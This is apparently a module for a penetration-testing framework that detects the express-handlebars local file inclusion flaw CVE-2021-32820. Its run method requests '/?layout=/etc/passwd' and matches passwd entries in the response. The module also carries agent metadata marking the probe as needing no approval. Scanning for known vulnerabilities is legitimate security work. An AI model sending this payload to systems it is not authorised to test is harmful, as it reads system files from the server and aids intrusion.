#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Express-handlebars is susceptible to local file inclusion because it mixes pure template data with engine conf."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Express-handlebars - Local File Inclusion Detection',
        'description': 'Express-handlebars is susceptible to local file inclusion because it mixes pure template data with engine configuration options through the Express render API. More specifically, the layout parameter may trigger file disclosure vulnerabilities in downstream applications. This potential vulnerability is somewhat restricted in that only files with existing extensions (i.e., file.extension) can be included. Files that lack an extension will have .handlebars appended to them. For complete details refer to the referenced GHSL-2021-018 report. Notes in documentation have been added to help users avoid this potential information exposure vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'expressjs', 'lfi', 'xxe', 'express_handlebars_project', 'node.js', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://securitylab.github.com/advisories/GHSL-2021-018-express-handlebars/',
            'https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/CVE-2021-32820.json',
            'https://github.com/express-handlebars/express-handlebars/pull/163',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-32820',
            'https://github.com/express-handlebars/express-handlebars/blob/78c47a235c4ad7bc2674bddd8ec2721567ed8c72/README.md#danger-',
        ],
        'cve': 'CVE-2021-32820',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?layout=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:', 'daemon:[x*]:0:0:', 'operator:[x*]:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Express-handlebars - Local File Inclusion detected",
                path='/?layout=/etc/passwd',
            )
            return True
        return False

